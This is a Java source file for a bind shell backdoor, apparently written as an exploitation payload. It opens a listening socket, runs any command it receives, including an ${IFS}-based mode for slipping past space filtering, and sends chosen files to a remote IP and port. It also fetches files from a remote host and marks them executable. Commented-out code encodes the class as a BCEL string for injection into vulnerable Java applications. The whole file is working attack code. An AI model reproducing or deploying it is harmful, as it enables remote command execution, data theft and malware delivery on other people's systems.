import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.net.ServerSocket;
import java.net.Socket;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;

/**
 * @author threedr3am
 */
public class ListenerShell implements Runnable {

    private String port;

    public ListenerShell(String port) {
        this.port = port;
        new Thread(this).start();
    }

    @Override
    public void run() {
        try {
            ServerSocket serverSocket = new ServerSocket(Integer.parseInt(port));
            Socket socket = serverSocket.accept();
            BufferedWriter bufferedWriter = new BufferedWriter(
                new OutputStreamWriter(socket.getOutputStream()));
            bufferedWriter.write("success!");
            bufferedWriter.newLine();
            bufferedWriter.flush();

            BufferedReader bufferedReader = new BufferedReader(
                new InputStreamReader(socket.getInputStream()));

            while (true) {
                String line = bufferedReader.readLine();
                if (line.equals("exit"))
                    return;
                Process pro = null;
                try {
                    if (line.startsWith("${IFS}")) {
                        line = line.substring(6);
                        String[] cmd = line.split("\\$\\{IFS\\}");
                        pro = Runtime.getRuntime().exec(cmd);
                    } else if (line.startsWith("download")) {
                        line = line.substring(8).trim();
                        String[] cmd = line.split(" ");
                        String file = cmd[0];
                        String ip = cmd[1];
                        String port = cmd[2];
                        byte[] bytes = Files.readAllBytes(Paths.get(file));
                        Socket transferFileSocket = new Socket(ip, Integer.parseInt(port));
                        transferFileSocket.getOutputStream().write(bytes);
                        transferFileSocket.getOutputStream().flush();
                        transferFileSocket.getOutputStream().close();
                        transferFileSocket.close();
                    } else if (line.startsWith("upload")) {
                        line = line.substring(6).trim();
                        String[] cmd = line.split(" ");
                        String file = cmd[0];
                        String ip = cmd[1];
                        String port = cmd[2];
                        Socket transferFileSocket = new Socket(ip, Integer.parseInt(port));
                        InputStream inputStream = transferFileSocket.getInputStream();
                        Path path = Paths.get(file);
                        Files.copy(inputStream, path);
                        if (Files.exists(path)) {
                            File toSetFile = path.toFile();
                            toSetFile.setExecutable(true);
                            toSetFile.setReadable(true);
                            toSetFile.setWritable(true);
                        }
                        inputStream.close();
                        transferFileSocket.close();
                    } else {
                        pro = Runtime.getRuntime().exec(line);
                    }
                } catch (Exception e) {
                    bufferedWriter.write(e.getMessage());
                    bufferedWriter.newLine();
                    bufferedWriter.flush();
                }
                BufferedReader bufferedReader2 = new BufferedReader(new InputStreamReader(pro.getInputStream()));
                StringBuilder stringBuilder2 = new StringBuilder();
                String line2;
                while ((line2 = bufferedReader2.readLine()) != null) {
                    stringBuilder2.append(line2).append("\n");
                }
                bufferedWriter.write(stringBuilder2.toString());
                bufferedWriter.newLine();
                bufferedWriter.flush();
            }
        } catch (IOException e) {
        }
    }

    public static void main(String[] args) throws Exception {
//        InputStream inputStream = ReverseShell.class.getResourceAsStream("ListenerShell.class");
//        byte[] bytes = new byte[inputStream.available()];
//        inputStream.read(bytes);
//        String code = Utility.encode(bytes, true);
//        System.out.println("$$BCEL$$" + code);
        new ListenerShell(args[0]);
    }
}